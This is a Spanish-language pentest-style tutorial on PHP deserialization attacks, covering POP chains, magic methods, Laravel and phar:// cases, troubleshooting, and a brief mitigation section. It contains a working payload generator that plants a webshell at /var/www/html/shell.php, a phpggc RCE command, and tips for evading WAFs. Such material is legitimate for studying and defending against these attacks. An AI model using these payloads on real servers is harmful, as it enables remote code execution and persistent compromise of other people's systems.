---
title: Deserialización PHP — objetos, magia y cadenas POP
tags: [web, php, deserialization, pop-chain, rce]
---

# Deserialización PHP: de una cookie a un webshell

[🇬🇧 English](php-deserialization.en.md) | **Español**

## 1. Reconocer el punto de entrada

PHP serializa con `serialize()` y reconstruye con `unserialize()`. El formato es inconfundible:

```text
O:4:"User":2:{s:4:"name";s:5:"admin";s:4:"role";s:5:"admin";}
a:2:{i:0;s:3:"foo";i:1;s:3:"bar";}
```

Aparece en cookies (`session`, `data`, `auth`), campos ocultos, `localStorage` y parámetros GET/POST. Si el valor va en base64, decodifícalo antes de tocar nada:

```bash
echo '<blob>' | base64 -d
```

## 2. Métodos mágicos que se ejecutan solos

`unserialize()` no llama a métodos arbitrarios, pero sí a los mágicos durante la reconstrucción:

| Método | Cuándo |
|---|---|
| `__wakeup()` | al deserializar |
| `__destruct()` | al destruir el objeto (fin de petición) |
| `__toString()` | al usarlo como string |
| `__call()` / `__get()` | acceso a métodos/propiedades inexistentes |

La cadena POP encadena esos métodos con clases ya cargadas en la aplicación hasta un `system()`, `file_put_contents()` o `eval()`.

## 3. Construir el payload

Con las clases del código fuente:

```php
<?php
class Logger {
    public $file = '/var/www/html/shell.php';
    public $data = '<?php system($_GET["c"]); ?>';
    function __destruct() { file_put_contents($this->file, $this->data); }
}
echo urlencode(serialize(new Logger()));
```

Si no puedes ejecutar PHP, genera el mismo string a mano o con una librería:

```python
from phpserialize import serialize
print(serialize({'file': '/tmp/x', 'data': 'id'}, charset='utf-8'))
```

Las longitudes (`s:5:"admin"`) cuentan **bytes**, no caracteres: con acentos o `<?php` hay que ajustarlas.

## 4. Casos con framework

- **Laravel**: `unserialize()` sobre la cookie `X-XSRF-TOKEN`/payload firmado; con `APP_KEY` se forja el cifrado y se llega a RCE (CVE-2018-15133). (`phpggc` tiene cadenas para Laravel/Symfony/Guzzle.)
- **`phar://`**: cualquier función de ficheros (`file_exists`, `getimagesize`) deserializa los metadatos de un `.phar`; sirve cuando no hay `unserialize()` directo.
- **WordPress plugins**: cadenas POP en plugins con `unserialize(base64_decode($_COOKIE[...]))`.

```bash
phpggc Laravel/RCE9 system id -b
```

## 5. Errores típicos

- **`unserialize(): Error at offset`** → longitud de string incorrecta; cuenta bytes.
- **El objeto se reconstruye pero no pasa nada** → la clase no está cargada (autoload) o el método mágico no es el que crees.
- **`__wakeup` lanza excepción** → hay validación; busca otra clase o `__destruct`.
- **El payload se filtra por WAF** → codifica en base64 si el código hace `base64_decode`, o usa `phar://`.
- **`phar://` no dispara** → el fichero debe ser un PHAR válido y la ruta debe llegar a él.

## 6. Detección y mitigación

- No deserializar entrada de usuario: usa JSON y validación de esquema.
- `unserialize($data, ['allowed_classes' => false])` cuando sea imprescindible.
- Firmar cookies (HMAC) y rotar `APP_KEY`/secretos si se filtran.
- WAF y SAST para `unserialize(`, `phar://`, `base64_decode(` en el mismo flujo.
- Revisar dependencias con cadenas POP conocidas (`phpggc` como referencia).

MITRE: T1059, T1190, T1505.
